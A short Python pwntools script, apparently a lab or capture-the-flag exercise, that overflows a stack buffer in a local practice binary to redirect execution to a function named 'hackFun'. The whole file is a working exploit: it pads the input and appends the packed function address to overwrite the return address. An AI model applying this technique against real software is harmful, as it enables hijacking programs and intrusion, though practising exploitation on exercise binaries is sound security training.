#!/usr/bin/python3
from pwn import *
prog = pwnlib.elf.load('smash_ex.stack-protect.exe')
fun_addr = prog.symbols['hackFun']
print(fun_addr)

p = process('./smash_ex.stack-protect.exe')
lines = p.readlines(4)
for line in lines:
  print(line.decode())
# Figure out how far away it is, need that distance + 8
# Create the right packed address
bytes_to_send = b'00000000'*3 + p64(fun_addr, 'little')

p.send(bytes_to_send)
lines = p.readall()
print(lines)
#for line in lines:
#  print(line.decode())

